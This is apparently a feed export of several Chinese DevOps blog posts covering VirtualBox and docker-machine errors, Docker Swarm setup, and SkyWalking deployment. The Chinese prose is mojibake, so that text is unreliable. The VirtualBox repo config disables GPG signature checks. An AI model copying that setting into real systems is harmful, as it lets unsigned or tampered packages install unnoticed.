<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[virtualbox]</span><br><span class="line">name&#x3D;Oracle Linux &#x2F; RHEL &#x2F; CentOS-$releasever &#x2F; $basearch - VirtualBox</span><br><span class="line">baseurl&#x3D;http:&#x2F;&#x2F;download.virtualbox.org&#x2F;virtualbox&#x2F;rpm&#x2F;el&#x2F;$releasever&#x2F;$basearch</span><br><span class="line">enabled&#x3D;1</span><br><span class="line">gpgcheck&#x3D;0</span><br><span class="line">repo_gpgcheck&#x3D;0</span><br><span class="line">gpgkey&#x3D;https:&#x2F;&#x2F;www.virtualbox.org&#x2F;download&#x2F;oracle_vbox.asc</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹VirtualBoxç‰ˆæœ¬ï¼Œé€‰æ‹©æŒ‡å®šç‰ˆæœ¬è¿›è¡Œå®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum search VirtualBox</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; N&#x2F;S matched: VirtualBox &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;_</span><br><span class="line">_VirtualBox-4.3.x86_64 : Oracle VM VirtualBox_ </span><br><span class="line">_VirtualBox-5.0.x86_64 : Oracle VM VirtualBox_ </span><br><span class="line">_VirtualBox-5.1.x86_64 : Oracle VM VirtualBox_ </span><br><span class="line">_VirtualBox-5.2.x86_64 : Oracle VM VirtualBox_ </span><br></pre></td></tr></table></figure>
<p>å®‰è£…å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y VirtualBox-5.2</span><br><span class="line">sudo /sbin/vboxconfig</span><br></pre></td></tr></table></figure>
<p><strong>é”™è¯¯2:</strong><br>åœ¨æ‰§è¡Œå‘½ä»¤â€œsudo /sbin/vboxconfigâ€æ—¶ï¼Œæç¤ºå¦‚ä¸‹ï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_This system is currently not set up to build kernel modules.</span><br><span class="line">_Please install the Linux kernel &quot;header&quot; files matching the current kernel_ _for adding new hardware support to the system. </span><br><span class="line">_The distribution packages containing the headers are probably:_ _kernel-devel kernel-devel-3.10.0-693.2.2.el7.x86_64</span><br><span class="line">_This system is currently not set up to build kernel modules.</span><br><span class="line">_Please install the Linux kernel &quot;header&quot; files matching the current kernel_ _for adding new hardware support to the system.</span><br><span class="line">_The distribution packages containing the headers are probably:_ _kernel-devel kernel-devel-3.10.0-693.2.2.el7.x86_64 </span><br></pre></td></tr></table></figure>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update kernel -y</span><br><span class="line">yum install kernel-headers kernel-devel gcc make -y</span><br></pre></td></tr></table></figure>
<p>é‡å¯æœåŠ¡å™¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">init 6</span><br></pre></td></tr></table></figure>
<p><strong>é”™è¯¯3:</strong><br>åœ¨æ‰§è¡Œå‘½ä»¤â€œdocker-machine create -d virtualbox testâ€æ—¶ï¼Œæç¤ºé”™è¯¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_Running pre-create checks...</span><br><span class="line">_Error with pre-create check: &quot;This computer doesn&#39;t have VT-X&#x2F;AMD-v enabled. </span><br><span class="line">Enabling it in the BIOS is mandatory&quot;_</span><br></pre></td></tr></table></figure>

<p>è§£å†³æ–¹æ³•ï¼š<br>é˜¿é‡Œäº‘ECSä¸æ”¯æŒï¼Œæ— æ³•å¼€å¯ï¼Œå¯ä»¥æ›´æ¢ä¸ºé˜¿é‡Œäº‘æä¾›çš„é©±åŠ¨<strong><em>aliyunecs</em></strong> </p>
<p><strong>é”™è¯¯4:</strong><br>åœ¨æ‰§è¡Œå‘½ä»¤â€œdocker-machine create -d aliyunecs testaliâ€æ—¶ï¼Œæç¤ºé”™è¯¯:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Driver &quot;aliyunecs&quot; not found. </span><br><span class="line">Do you have the plugin binary &quot;docker-machine-driver-aliyunecs&quot; accessible in your PATH?</span><br></pre></td></tr></table></figure>
<p>è§£å†³æ–¹æ³•ï¼š<br>æ‰¾ä¸åˆ°å¯¹åº”åç§°çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ï¼Œåœ¨æ‹·è´åˆ°/usr/local/binç›®å½•ä¹‹å‰ï¼Œå…ˆä¿®æ”¹æ–‡ä»¶åç§°ï¼Œå»æ‰.linux-amd64,å¦‚ä¸‹ï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-machine-driver-aliyunecs.linux-amd64 &gt;&gt; docker-machine-driver-aliyunecs </span><br></pre></td></tr></table></figure>
<p><strong>é”™è¯¯5:</strong><br>æ‰§è¡Œåˆ›å»ºä¸»æœºçš„æ—¶å€™æç¤ºï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error setting machine configuration from flags provided: testali | aliyunecs driver </span><br><span class="line">requires the --aliyunecs-access-key-id option_ </span><br></pre></td></tr></table></figure>
<p>è§£å†³æ–¹æ³•ï¼š<br><strong>aliyunecs-access-key-id</strong>å’Œ<strong>aliyunecs-access-key-secret</strong>æ˜¯å¿…å¡«å‚æ•°ï¼Œå¯ä»¥ç›´æ¥åœ¨aliyunecsåè¿½åŠ ï¼Œä¹Ÿå¯ä»¥è®¾ç½®åˆ°ç¯å¢ƒå˜é‡å½“ä¸­</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>dockerä¸‰å‰‘å®¢</tag>
        <tag>docker-machine</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerä¸‰å‰‘å®¢ä¹‹docker-swarm</title>
    <url>/2018/09/17/docker-docker-swarm/</url>
    <content><![CDATA[<h4 id="æ‰¯æ·¡"><a href="#æ‰¯æ·¡" class="headerlink" title="æ‰¯æ·¡"></a>æ‰¯æ·¡</h4><p>é›†ç¾¤æ¨¡å¼æ˜¯æŒ‡åœ¨DOCKERå¼•æ“ä¸­åµŒå…¥çš„é›†ç¾¤ç®¡ç†å’Œç¼–æ’ç‰¹å¾ã€‚å½“ä½ åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„é›†ç¾¤æˆ–åŠ å…¥ä¸€ä¸ªé›†ç¾¤çš„èŠ‚ç‚¹æ—¶ï¼ŒDOCKERå¼•æ“ä»¥é›†ç¾¤æ¨¡å¼è¿è¡Œã€‚ Â  Â  Â  Â <br>ä¸ºä»€ä¹ˆéœ€è¦é›†ç¾¤ï¼Ÿä¸ºäº†è§£å†³å•æœºç“¶é¢ˆï¼Œä»ä¸€åˆ°å¤šï¼Œéƒ¨ç½²å¤šä»½ï¼Œä»è€Œæ„æˆâ€œé›†ç¾¤â€ã€‚<br>ä»å•æœºåˆ°é›†ç¾¤ï¼Œä»£ç åŸºæœ¬æ— éœ€ä¿®æ”¹ï¼Œä»…ä»…æ˜¯æœåŠ¡å™¨çš„æ‰©å®¹ï¼Œç®€å•ç›´æ¥çš„æå‡äº†æœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›ã€‚ Â <br> Â  Â  Â <br>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://docs.docker.com/engine/swarm/swarm-tutorial/create-swarm">https://docs.docker.com/engine/swarm/swarm-tutorial/create-swarm</a></p>
<h4 id="é›†ç¾¤æ­å»º"><a href="#é›†ç¾¤æ­å»º" class="headerlink" title="é›†ç¾¤æ­å»º"></a>é›†ç¾¤æ­å»º</h4><p>æˆ‘ä»¬ä½¿ç”¨docker-machineæ¥åˆ›å»ºå‡ ä¸ªä¸»æœºï¼Œç”¨æ¥æ¼”ç¤ºswarmé›†ç¾¤çš„åˆ›å»ºã€‚</p>
<p>1ï¼Œå…ˆåˆ›å»º3å°ä¸»æœºï¼Œæˆ‘è¿™é‡Œçš„å‘½åæ˜¯ï¼šh1 / h2 / h3ï¼Œç”¨å…¶ä¸­çš„ä¸€å°ä¸»æœºä½œä¸ºLeaderï¼Œåˆå§‹åŒ–swarmé›†ç¾¤ï¼Œå¹¶ç®¡ç†èŠ‚ç‚¹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com h1</span><br><span class="line"></span><br><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com h2</span><br><span class="line"></span><br><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com h3</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹åˆ›å»ºå¥½çš„3å°ä¸»æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ls</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS_ </span><br><span class="line">_h1 - xhyve Running tcp:&#x2F;&#x2F;192.168.64.5:2376 v18.06.1-ce_ </span><br><span class="line">_h2 - xhyve Running tcp:&#x2F;&#x2F;192.168.64.6:2376 v18.06.1-ce_ </span><br><span class="line">_h3 - xhyve Running tcp:&#x2F;&#x2F;192.168.64.7:2376 v18.06.1-ce_</span><br></pre></td></tr></table></figure>
<p>2ï¼Œç™»å½•h1ä¸»æœºï¼Œåˆå§‹åŒ–swarmé›†ç¾¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ssh h1</span><br><span class="line">docker swarm init --advertise-addr 192.168.64.5</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_Swarm initialized: </span><br><span class="line">current node (h78ft6qqs27xxi1af9lw7w4tk) is now a manager.</span><br><span class="line">To add a worker to this swarm, run the following </span><br><span class="line"></span><br><span class="line">command:</span><br><span class="line">docker swarm join --token SWMTKN-1-2lk16l2cjvporghr3g1kg6orjrotq682axu2yc0kjm5aepvois-br6bpyng0bvqg2jqcn4ud3cvs 192.168.64.5:2377 </span><br><span class="line"></span><br><span class="line">To add a manager to this swarm, run &#39;docker swarm join-token manager&#39; and follow the instructions.</span><br></pre></td></tr></table></figure>

<p>3ï¼Œåˆ†åˆ«ç™»å½•<strong>h2</strong>å’Œ<strong>h3</strong>ï¼Œæ‰§è¡Œä¸Šé¢è¾“å‡ºçš„joinå‘½ä»¤çš„æ·»åŠ åˆ°swarmé›†ç¾¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm join --token SWMTKN-1-2lk16l2cjvporghr3g1kg6orjrotq682axu2yc0kjm5aepvois-br6bpyng0bvqg2jqcn4ud3cvs 192.168.64.5:2377</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure>
<p>åç»­ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹æ·»åŠ èŠ‚ç‚¹çš„tokenå’Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm join-token worker</span><br></pre></td></tr></table></figure>
<p>4ï¼Œé‡æ–°ç™»å½•h1ï¼ŒæŸ¥çœ‹é›†ç¾¤èŠ‚ç‚¹æƒ…å†µï¼Œ<strong>Leader</strong>è¡¨ç¤ºä¸»èŠ‚ç‚¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ssh h1</span><br><span class="line"></span><br><span class="line">docker node ls</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION_ </span><br><span class="line">_h78ft6qqs27xxi1af9lw7w4tk h1 Ready Active Leader 18.06.1-ce_ </span><br><span class="line">_ifo2uegzz9s1619t72gnz64yk h2 Ready Active 18.06.1-ce_ </span><br><span class="line">_fysd1bc0knxvgkk53604joje2 h3 Ready Active 18.06.1-ce_ </span><br></pre></td></tr></table></figure>

<p>5ï¼Œç§»é™¤é›†ç¾¤èŠ‚ç‚¹ </p>
<p>aï¼Œåœ¨éœ€è¦é€€å‡ºçš„èŠ‚ç‚¹ä¸Šæ“ä½œä¸‹é¢å‘½ä»¤downæ‰èŠ‚ç‚¹ï¼Œå¦‚éœ€å¼ºåˆ¶é€€å‡ºï¼Œå¯æ·»åŠ å‚æ•°â€œ-fâ€ï¼Œå¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm leave -f</span><br></pre></td></tr></table></figure>
<p>bï¼Œåˆ°ä¸»èŠ‚ç‚¹ä¸Šâ€œdocker node lsâ€åˆ—å‡ºæ‰€æœ‰èŠ‚ç‚¹ï¼Œæ ¹æ®idä½¿ç”¨å‘½ä»¤â€œdocker node rm <id>â€åˆ é™¤èŠ‚ç‚¹å³å¯ï¼Œå¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker node rm &lt;ID&gt;</span><br></pre></td></tr></table></figure>
<p>Â </p>
<h4 id="æœåŠ¡éƒ¨ç½²ä¸æ‰©å®¹"><a href="#æœåŠ¡éƒ¨ç½²ä¸æ‰©å®¹" class="headerlink" title="æœåŠ¡éƒ¨ç½²ä¸æ‰©å®¹"></a>æœåŠ¡éƒ¨ç½²ä¸æ‰©å®¹</h4><p>å¦‚ä½•å°†æˆ‘ä»¬çš„å®¹å™¨éƒ¨ç½²åˆ°swarmé›†ç¾¤ï¼Ÿä¸‹é¢æˆ‘ä»¬ä½¿ç”¨nginxæ¥æ¼”ç¤ºã€‚</p>
<p>1ï¼Œç™»å½•ä¸»æœºï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤éƒ¨ç½²nginxæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service create --replicas 3 -p 80:80 --name nginx nginx:1.15-alpine</span><br></pre></td></tr></table></figure>
<p>2ï¼ŒæŸ¥çœ‹æœåŠ¡éƒ¨ç½²æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service ls</span><br><span class="line">æˆ–</span><br><span class="line">docker service ps nginx</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_ID NAME MODE REPLICAS IMAGE PORTS_ </span><br><span class="line">_26fd9ljhbjsp nginx replicated 3&#x2F;3 nginx:1.15-alpine \*:80-&gt;80&#x2F;tcp_ </span><br></pre></td></tr></table></figure>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥åœ¨æµè§ˆå™¨è¾“å…¥ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€ï¼Œè®¿é—®éƒ¨ç½²åˆ°nginxæœåŠ¡äº†ï¼Œå¦‚è®¿é—®ï¼šâ€œ<a href="http://192.168.64.5â€/">http://192.168.64.5â€</a> </p>
<p>3ï¼ŒæœåŠ¡æ‰©å®¹ï¼Œæˆ‘ä»¬é€šè¿‡scaleå‘½ä»¤å¯ä»¥é’ˆå¯¹é›†ç¾¤çš„æœåŠ¡è¿›è¡Œæ‰©å®¹å’Œç¼©å‡ï¼Œæ§åˆ¶çš„æ•°é‡ä¸ºå½“å‰é›†ç¾¤çš„æŒ‡å®šæœåŠ¡æ•°é‡ï¼Œä¸€åˆ‡éƒ½å˜çš„é‚£ä¹ˆè‡ªç„¶ï¼Œå¯æ§ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service scale nginx=3</span><br></pre></td></tr></table></figure>
<h4 id="é›†ç¾¤ç›‘æ§å¹³å°"><a href="#é›†ç¾¤ç›‘æ§å¹³å°" class="headerlink" title="é›†ç¾¤ç›‘æ§å¹³å°"></a>é›†ç¾¤ç›‘æ§å¹³å°</h4><p>ç›‘æ§æ˜¯å¿…é¡»çš„ï¼Œè¿™ä½¿å¾— æˆ‘ä»¬å¯ä»¥æ›´ç›´æ¥çš„è§‚å¯Ÿå’Œç®¡ç† é›†ç¾¤ä¸­çš„èŠ‚ç‚¹å’ŒæœåŠ¡ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨çš„æ˜¯Docker Swarm Visualizerï¼Œç®€å•ç›´è§‚ã€‚</p>
<p>ç™»å½•ç®¡ç†èŠ‚ç‚¹ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ·»åŠ ç›‘æ§ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker service create \\</span><br><span class="line">--name=viz \\</span><br><span class="line">--publish=8080:8080/tcp \\</span><br><span class="line">--constraint=node.role==manager \\</span><br><span class="line">--mount=<span class="built_in">type</span>=<span class="built_in">bind</span>,src=/var/run/docker.sock,dst=/var/run/docker.sock \\</span><br><span class="line">dockersamples/visualizer</span><br></pre></td></tr></table></figure>
<p>ç›‘æ§éƒ¨ç½²åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®åœ°å€æŸ¥çœ‹ï¼š<a href="http://192.168.64.7:8080/">http://192.168.64.7:8080/</a><br>ç›‘æ§æ•ˆæœï¼š </p>
<p align="center">
    <a href="#"><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/docker/viz.jpg" width="450px"></a>
</p>

<h4 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><p><strong>docker swarm</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker swarm init #åˆå§‹åŒ–é›†ç¾¤ </span><br><span class="line">docker swarm join-token worker #æŸ¥çœ‹å·¥ä½œèŠ‚ç‚¹ </span><br><span class="line">token docker swarm join-token manager #æŸ¥çœ‹ç®¡ç†èŠ‚ç‚¹ </span><br><span class="line">token docker swarm join #åŠ å…¥é›†ç¾¤ä¸­ </span><br></pre></td></tr></table></figure>
<p><strong>docker node</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker node ls #æŸ¥çœ‹æ‰€æœ‰é›†ç¾¤èŠ‚ç‚¹ </span><br><span class="line">docker node rm #åˆ é™¤æŸä¸ªèŠ‚ç‚¹ï¼ˆ-få¼ºåˆ¶åˆ é™¤ï¼‰ </span><br><span class="line">docker node inspect #æŸ¥çœ‹èŠ‚ç‚¹è¯¦æƒ… </span><br><span class="line">docker node demote #èŠ‚ç‚¹é™çº§ï¼Œç”±ç®¡ç†èŠ‚ç‚¹é™çº§ä¸ºå·¥ä½œèŠ‚ç‚¹ </span><br><span class="line">docker node promote #èŠ‚ç‚¹å‡çº§ï¼Œç”±å·¥ä½œèŠ‚ç‚¹å‡çº§ä¸ºç®¡ç†èŠ‚ç‚¹ </span><br><span class="line">docker node update #æ›´æ–°èŠ‚ç‚¹ </span><br><span class="line">docker node ps #æŸ¥çœ‹èŠ‚ç‚¹ä¸­çš„ Task ä»»åŠ¡ </span><br></pre></td></tr></table></figure>
<p><strong>docker service</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker service create #éƒ¨ç½²æœåŠ¡ </span><br><span class="line">docker service inspect #æŸ¥çœ‹æœåŠ¡è¯¦æƒ… </span><br><span class="line">docker service logs #äº§çœ‹æŸä¸ªæœåŠ¡æ—¥å¿— </span><br><span class="line">docker service ls #æŸ¥çœ‹æ‰€æœ‰æœåŠ¡è¯¦æƒ… </span><br><span class="line">docker service rm #åˆ é™¤æŸä¸ªæœåŠ¡ï¼ˆ-få¼ºåˆ¶åˆ é™¤ï¼‰ </span><br><span class="line">docker service scale #è®¾ç½®æŸä¸ªæœåŠ¡ä¸ªæ•° </span><br><span class="line">docker service update #æ›´æ–°æŸä¸ªæœåŠ¡</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>dockerä¸‰å‰‘å®¢</tag>
        <tag>docker-swarm</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockeréƒ¨ç½²SkyWalkingï¼Œä»¥åŠJavaé¡¹ç›®é›†æˆ</title>
    <url>/2020/10/01/docker_install_skywalking/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>SkyWalkingæ˜¯ä¸€ä¸ªå¼€æºçš„APM(åº”ç”¨ç¨‹åºæ€§èƒ½ç›‘è§†å™¨)ç³»ç»Ÿï¼Œä¸“ä¸ºå¾®æœåŠ¡ã€äº‘åŸç”Ÿå’ŒåŸºäºå®¹å™¨çš„ä½“ç³»ç»“æ„è€Œè®¾è®¡ã€‚<br>åŠŸèƒ½åŒ…æ‹¬å¯¹Cloud Nativeä½“ç³»ç»“æ„ä¸­çš„åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç›‘è§†ï¼Œè·Ÿè¸ªï¼Œè¯Šæ–­ï¼ŒæŠ¥è­¦ç­‰ï¼Œå…·ä½“åŠŸèƒ½æ˜ç»†å‚è§<a href="http://skywalking.apache.org/">å®˜ç½‘</a>ã€‚</p>
<h4 id="éƒ¨ç½²skywalking"><a href="#éƒ¨ç½²skywalking" class="headerlink" title="éƒ¨ç½²skywalking"></a>éƒ¨ç½²skywalking</h4><p>æœ¬æ–‡ä½¿ç”¨docker-composeçš„æ–¹å¼è¿›è¡Œçš„éƒ¨ç½²ï¼Œå®˜ç½‘é»˜è®¤çš„dockerç¤ºä¾‹æ˜¯esæ•°æ®åº“ï¼Œeså ç”¨å†…å­˜å¤§ï¼Œç¤ºä¾‹æœºå™¨å†…å­˜ä¸è¶³ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨è‡ªå¸¦çš„h2æ•°æ®åº“æ¥ä¿å­˜skywalkingäº§ç”Ÿçš„æ•°æ®ã€‚</p>
<p>docker-compose.ymlï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">skywalking-oap:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apache/skywalking-oap-server:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">skywalking-oap</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">11800</span><span class="string">:11800</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">12800</span><span class="string">:12800</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> [<span class="string">&quot;CMD-SHELL&quot;</span>, <span class="string">&quot;/skywalking/bin/swctl&quot;</span>]</span><br><span class="line">      <span class="attr">interval:</span> <span class="string">30s</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="string">10s</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">3</span></span><br><span class="line">      <span class="attr">start_period:</span> <span class="string">40s</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Xms512m -Xmx512m&quot;</span></span><br><span class="line">  <span class="attr">skywalking-ui:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apache/skywalking-ui:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">skywalking-ui</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">skywalking-oap</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">skywalking-oap</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3380</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">SW_OAP_ADDRESS:</span> <span class="string">skywalking-oap:12800</span></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œdocker-composeå‘½ä»¤ï¼Œè¿è¡Œskywalkingï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h4 id="ä¸‹è½½skywalking-agent-jar"><a href="#ä¸‹è½½skywalking-agent-jar" class="headerlink" title="ä¸‹è½½skywalking-agent.jar"></a>ä¸‹è½½skywalking-agent.jar</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="http://skywalking.apache.org/downloads/">http://skywalking.apache.org/downloads/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /home/pro-mall/</span><br><span class="line"><span class="built_in">cd</span> /home/pro-mall/</span><br><span class="line">wget https://mirror.bit.edu.cn/apache/skywalking/8.1.0/apache-skywalking-apm-8.1.0.tar.gz</span><br><span class="line">tar -zxvf apache-skywalking-apm-8.1.0.tar.gz </span><br><span class="line"></span><br><span class="line"><span class="comment"># skywalking-agent.jaræ–‡ä»¶å®Œæ•´åœ°å€</span></span><br><span class="line">/home/pro-mall/apache-skywalking-apm-bin/agent/skywalking-agent.jar</span><br><span class="line"><span class="comment"># agentå‚æ•°ä»‹ç»</span></span><br><span class="line">/home/pro-mall/apache-skywalking-apm-bin/agent/config/agent.config</span><br></pre></td></tr></table></figure>
<h4 id="é¡¹ç›®ä½¿ç”¨"><a href="#é¡¹ç›®ä½¿ç”¨" class="headerlink" title="é¡¹ç›®ä½¿ç”¨"></a>é¡¹ç›®ä½¿ç”¨</h4><p>ä»¥agentçš„æ–¹å¼å¯åŠ¨ï¼Œå¯¹ä»£ç æ²¡æœ‰ä¾µå…¥æ€§ï¼Œç›´æ¥åœ¨å¯åŠ¨å‘½ä»¤ä¸ŠæŒ‡å®šjavaagentå³å¯ã€‚</p>
<p>å¯åŠ¨å‘½ä»¤javaagentå‚æ•°æ·»åŠ ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:/home/pro-mall/apache-skywalking-apm-bin/agent/skywalking-agent.jar -DSW_AGENT_COLLECTOR_BACKEND_SERVICES=127.0.0.1:11800 -DSW_AGENT_NAME=pro-mall -jar xxxxx</span><br></pre></td></tr></table></figure>
<p>å¯åŠ¨ç¨‹åºåï¼Œç™»å½•skywalkingæŸ¥çœ‹ç›‘æ§æƒ…å†µï¼š<a href="http://localhost:3380/">http://localhost:3380</a></p>
<p>ç›‘æ§é¢æ¿ï¼š<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/skywalking/sk1.png" alt="ç›‘æ§é¢æ¿"></p>
<p>è°ƒç”¨é“¾è·¯ï¼š<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/skywalking/sk2.png" alt="è°ƒç”¨é“¾è·¯"></p>
]]></content>
      <categories>
        <category>docker</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>SkyWalking</tag>
        <tag>ç›‘æ§</tag>
      </tags>
  </entry>
  <entry>
    <title>æ­å»ºELKæ—¥å¿—æœåŠ¡å’ŒSpringBooté›†æˆ</title>
    <url>/2020/09/08/elk-log-springboot/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä¸€ä¸ªå®Œæ•´è½¯ä»¶ç³»ç»Ÿï¼Œæ—¥å¿—æœåŠ¡æ˜¯å¿…ä¸å¯å°‘çš„ä¸€ç¯ï¼Œå®šä½é—®é¢˜ï¼Œåˆ†ææ—¥å¿—éƒ½éœ€è¦å®ƒçš„å¸®åŠ©ï¼Œç°åœ¨å¸‚é¢ä¸Šç”¨çš„æ¯”è¾ƒå¤šçš„æ—¥å¿—æœåŠ¡æ–¹æ¡ˆæ˜¯ELKï¼Œæˆ‘çœ‹çœ‹å¦‚ä½•æ¥æ­å»ºé›†æˆã€‚</p>
